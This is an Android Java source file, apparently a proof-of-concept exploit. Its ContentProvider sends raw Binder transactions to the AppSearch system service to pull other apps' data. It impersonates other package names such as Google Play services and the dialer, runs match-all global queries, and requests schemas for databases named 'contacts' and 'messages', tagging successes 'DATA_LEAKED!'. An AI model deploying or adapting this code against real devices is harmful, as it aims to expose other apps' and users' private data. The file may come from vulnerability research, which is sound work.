package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class AppSearchLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("appsearch")) {
            probeAppSearchWithCallback(cursor);
        } else if (path != null && path.contains("init")) {
            probeAppSearchInit(cursor);
        } else if (path != null && path.contains("crosspkg")) {
            probeCrossPackageAccess(cursor);
        } else {
            probeAppSearchWithCallback(cursor);
            probeCrossPackageAccess(cursor);
        }

        return cursor;
    }

    private void probeAppSearchWithCallback(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("app_search");
        if (binder == null) { cursor.addRow(new Object[]{"app_search", "no_binder"}); return; }
        String desc = "android.app.appsearch.aidl.IAppSearchManager";

        // First: initialize our own session (TX=21)
        // initialize(String packageName, IAppSearchResultCallback callback)
        final String[] initResult = {null};
        final CountDownLatch initLatch = new CountDownLatch(1);

        IBinder initCallback = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
                try {
                    initResult[0] = "cb_code=" + code + " avail=" + data.dataAvail();
                    if (data.dataAvail() > 4) {
                        data.enforceInterface("android.app.appsearch.aidl.IAppSearchResultCallback");
                        // AppSearchResult parcelable
                        int resultCode = data.readInt();
                        initResult[0] += " resultCode=" + resultCode;
                        if (resultCode == 0) {
                            initResult[0] += " SUCCESS";
                        } else {
                            String errMsg = data.readString();
                            initResult[0] += " err=" + truncate(errMsg);
                        }
                    }
                } catch (Exception e) {
                    initResult[0] = "cb_err:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage());
                }
                initLatch.countDown();
                return true;
            }
        };

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName()); // callerAttributionSource packageName
            data.writeStrongBinder(initCallback);
            binder.transact(21, data, reply, 0);
            int ex = reply.readInt();
            if (ex != 0) {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"init", "Ex=" + ex + "|" + truncate(msg)});
                data.recycle(); reply.recycle();
                return;
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"init", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
            data.recycle(); reply.recycle();
            return;
        }
        data.recycle();
        reply.recycle();

        try { initLatch.await(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
        cursor.addRow(new Object[]{"init_cb", initResult[0] != null ? initResult[0] : "TIMEOUT"});

        // Now try globalQuery (TX=7) with a real callback
        final String[] gqResult = {null};
        final CountDownLatch gqLatch = new CountDownLatch(1);

        IBinder gqCallback = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
                try {
                    int avail = data.dataAvail();
                    gqResult[0] = "cb_code=" + code + " avail=" + avail;
                    if (avail > 8) {
                        // Try to read the interface token
                        try { data.enforceInterface("android.app.appsearch.aidl.IAppSearchResultCallback"); } catch (Exception ignored) {}
                        int resultCode = data.readInt();
                        gqResult[0] += " resultCode=" + resultCode;
                        if (resultCode == 0 && data.dataAvail() > 0) {
                            // Read SearchResultPage
                            int remaining = data.dataAvail();
                            gqResult[0] += " dataRemaining=" + remaining;
                            // Try reading next token
                            long nextPageToken = data.readLong();
                            gqResult[0] += " nextToken=" + nextPageToken;
                            // Results list
                            int resultCount = data.readInt();
                            gqResult[0] += " resultCount=" + resultCount;
                            if (resultCount > 0 && resultCount < 1000) {
                                gqResult[0] += " DATA_LEAKED!";
                                // Try to read first result
                                for (int i = 0; i < Math.min(resultCount, 3); i++) {
                                    try {
                                        String pkg = data.readString();
                                        String db = data.readString();
                                        String ns = data.readString();
                                        gqResult[0] += " [" + pkg + "/" + db + "/" + ns + "]";
                                    } catch (Exception e) { break; }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    gqResult[0] = "cb_err:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage());
                }
                gqLatch.countDown();
                return true;
            }
        };

        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(""); // queryExpression - empty string matches all
            // SearchSpec parcelable
            data.writeInt(1); // non-null
            data.writeInt(1); // termMatchType PREFIX
            data.writeInt(0); // schemaTypes count
            data.writeInt(0); // namespaces count
            data.writeInt(0); // packageNames count
            data.writeInt(0); // resultGroupingLimit
            data.writeInt(10); // resultCountPerPage
            data.writeInt(0); // rankingStrategy
            data.writeInt(0); // order
            data.writeInt(0); // snippetCount
            data.writeInt(0); // snippetCountPerProperty
            data.writeInt(0); // maxSnippetSize
            data.writeInt(0); // projectionSpecs count
            data.writeInt(0); // resultGroupings count
            data.writeInt(0); // propertyWeights count
            data.writeInt(0); // joinSpec null
            data.writeInt(0); // advanced ranking expression null
            data.writeInt(0); // searchSourceLogTag null
            data.writeInt(0); // informationalRankingExpressions count
            data.writeInt(0); // embeddingParameters count
            data.writeStrongBinder(gqCallback);
            data.writeInt(0); // userId
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex != 0) {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"globalQuery", "Ex=" + ex + "|" + truncate(msg)});
            } else {
                cursor.addRow(new Object[]{"globalQuery_send", "ACCEPTED"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"globalQuery", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        try { gqLatch.await(5, TimeUnit.SECONDS); } catch (Exception ignored) {}
        cursor.addRow(new Object[]{"globalQuery_result", gqResult[0] != null ? gqResult[0] : "TIMEOUT(no callback)"});

        // Also try TX=6: query own package's AppSearch
        final String[] ownResult = {null};
        final CountDownLatch ownLatch = new CountDownLatch(1);

        IBinder ownCallback = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
                try {
                    ownResult[0] = "cb_code=" + code + " avail=" + data.dataAvail();
                } catch (Exception e) {
                    ownResult[0] = "cb_err:" + e.getMessage();
                }
                ownLatch.countDown();
                return true;
            }
        };

        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString("testdb");
            data.writeString(""); // query all
            data.writeInt(1); // SearchSpec non-null
            data.writeInt(1); data.writeInt(0); data.writeInt(0); data.writeInt(0);
            data.writeInt(0); data.writeInt(10); data.writeInt(0); data.writeInt(0);
            data.writeInt(0); data.writeInt(0); data.writeInt(0); data.writeInt(0);
            data.writeInt(0); data.writeInt(0); data.writeInt(0); data.writeInt(0);
            data.writeInt(0); data.writeInt(0); data.writeInt(0);
            data.writeStrongBinder(ownCallback);
            data.writeInt(0);
            binder.transact(6, data, reply, 0);
            int ex = reply.readInt();
            if (ex != 0) {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"ownQuery", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"ownQuery", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        try { ownLatch.await(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
        cursor.addRow(new Object[]{"ownQuery_result", ownResult[0] != null ? ownResult[0] : "TIMEOUT"});
    }

    private void probeAppSearchInit(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("app_search");
        if (binder == null) { cursor.addRow(new Object[]{"app_search", "no_binder"}); return; }
        String desc = "android.app.appsearch.aidl.IAppSearchManager";

        // Try to initialize as a different package (TX=21)
        String[] targets = {"com.google.android.gms", "com.android.settings", "com.google.android.dialer"};
        for (String target : targets) {
            final String[] result = {null};
            final CountDownLatch latch = new CountDownLatch(1);

            IBinder callback = new Binder() {
                @Override
                protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
                    result[0] = "cb_code=" + code + " avail=" + data.dataAvail();
                    latch.countDown();
                    return true;
                }
            };

            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(target); // impersonate another package
                data.writeStrongBinder(callback);
                binder.transact(21, data, reply, 0);
                int ex = reply.readInt();
                if (ex != 0) {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"init_" + target.substring(target.lastIndexOf('.')+1), "Ex=" + ex + "|" + truncate(msg)});
                } else {
                    try { latch.await(2, TimeUnit.SECONDS); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"init_" + target.substring(target.lastIndexOf('.')+1),
                        result[0] != null ? result[0] : "TIMEOUT"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"init_" + target.substring(target.lastIndexOf('.')+1), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeCrossPackageAccess(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("app_search");
        if (binder == null) { cursor.addRow(new Object[]{"app_search", "no_binder"}); return; }
        String desc = "android.app.appsearch.aidl.IAppSearchManager";

        // TX=2: getSchema for other packages
        String[] targets = {"com.google.android.gms", "com.android.settings",
            "com.google.android.dialer", "com.google.android.apps.messaging"};
        String[] databases = {"", "default", "contacts", "messages", "settings"};

        for (String target : targets) {
            for (String db : databases) {
                final String[] result = {null};
                final CountDownLatch latch = new CountDownLatch(1);

                IBinder callback = new Binder() {
                    @Override
                    protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
                        int avail = data.dataAvail();
                        result[0] = "cb=" + code + " avail=" + avail;
                        if (avail > 20) {
                            result[0] += " HAS_DATA";
                            try {
                                data.enforceInterface("android.app.appsearch.aidl.IAppSearchResultCallback");
                            } catch (Exception ignored) {}
                            try {
                                int rc = data.readInt();
                                result[0] += " rc=" + rc;
                                if (rc == 0 && data.dataAvail() > 0) {
                                    result[0] += " SCHEMA_LEAKED! remaining=" + data.dataAvail();
                                }
                            } catch (Exception ignored) {}
                        }
                        latch.countDown();
                        return true;
                    }
                };

                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeString(target);
                    data.writeString(db);
                    data.writeStrongBinder(callback);
                    data.writeInt(0); // userId
                    binder.transact(2, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex != 0) {
                        String msg = null;
                        try { msg = reply.readString(); } catch (Exception ignored) {}
                        cursor.addRow(new Object[]{"schema_" + target.substring(target.lastIndexOf('.')+1) + "_" + db,
                            "Ex=" + ex + "|" + truncate(msg)});
                    } else {
                        try { latch.await(2, TimeUnit.SECONDS); } catch (Exception ignored) {}
                        cursor.addRow(new Object[]{"schema_" + target.substring(target.lastIndexOf('.')+1) + "_" + db,
                            result[0] != null ? result[0] : "TIMEOUT"});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"schema_" + target.substring(target.lastIndexOf('.')+1) + "_" + db,
                        "ERR:" + e.getClass().getSimpleName()});
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
